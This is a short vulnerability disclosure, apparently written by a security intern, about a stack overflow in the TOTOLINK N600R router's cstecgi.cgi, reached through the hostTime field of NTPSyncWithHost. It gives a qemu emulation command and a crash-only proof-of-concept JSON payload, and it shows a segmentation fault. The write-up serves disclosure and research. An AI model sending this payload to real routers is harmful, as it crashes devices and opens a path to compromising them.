# TOTOLINK-N600R-NTPSyncWithHost-StackOverflow

﻿During my internship at Qi An Xin Tiangong Lab, I discovered a StackOverflow vulnerability in the TOTOLINK-N600R router.

By analyzing the cstecgi.cgi file in the cgi-bin directory, I found that the function at address 0x4141B8 contains a stack overflow vulnerability.

The stack overflow can be triggered by the hostTime key value, which leads to a sprintf overflow.

![image-20241216173327658](https://gitee.com/xyqer/pic/raw/master/202412191544832.png)

## How can we simulate a router

﻿Use the following command to simulate with qemu.

```bash
sudo chroot . ./qemu-mips-static -E CONTENT_LENGTH=300 -E QUERY_STRING="action=no" -L /lib ./web_cste/cgi-bin/cstecgi_patch.cgi < ./poc.json
```

﻿The content of the **poc.json** file is as follows:

```json
{"topicurl":"NTPSyncWithHost","hostTime":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}
```

## Attack result

![image-20241216173758643](https://gitee.com/xyqer/pic/raw/master/202412191544750.png)

You can see that Segmentation fault. If needed, we can overflow more. This overflow does not have a length limit. When using a longer overflow, you only need to modify the hostTime key value and the CONTENT_LENGTH size.